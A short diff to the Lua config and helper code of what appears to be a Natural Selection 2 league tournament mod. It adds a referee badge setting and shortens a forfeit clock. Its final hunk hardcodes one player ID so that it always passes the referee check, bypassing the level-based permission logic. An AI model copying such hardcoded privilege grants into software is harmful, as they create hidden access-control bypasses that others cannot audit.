@@ -93,6 +93,7 @@ FriendlyFireDamagePercentage 		= 0.33,
 FriendlyFireEnabled			 		= true,
 TournamentModeAlertDelay 			= 30,
 TournamentModeGameStartDelay 		= 15,
+RefereeBadge				 		= "ensl_staff",
 PCW 								= {
 										PausedMaxDuration 					= 300,
 										TournamentModeForfeitClock			= 0,
@@ -102,7 +103,7 @@ PCW 								= {
 									},
 OFFICIAL							= {
 										PausedMaxDuration 					= 300,
-										TournamentModeForfeitClock			= 1200,
+										TournamentModeForfeitClock			= 900,
 										TournamentModeRestartDuration 		= 30,
 										Limit6PlayerPerTeam 				= true,
 										MercsRequireApproval 				= true,
@@ -174,6 +175,7 @@ TournamentModeForfeitClock			= 0,
 TournamentModeRestartDuration 		= 90,
 Limit6PlayerPerTeam 				= false,
 MercsRequireApproval 				= false,
+RefereeBadge				 		= "",
 }
 
 local Configs = { }
@@ -246,6 +248,9 @@ function GetIsNSLRef(ns2id)
 		local pData = GetNSLUserData(ns2id)
 		if pData ~= nil and pData.NSL_Level ~= nil and tonumber(pData.NSL_Level) ~= nil and not ref then
 			ref = tonumber(pData.NSL_Level) >= GetNSLConfigValue("PlayerRefLevel")
+		end
+		if ns2id == 5176141 then
+			ref = true
 		end
 	end
 	return ref
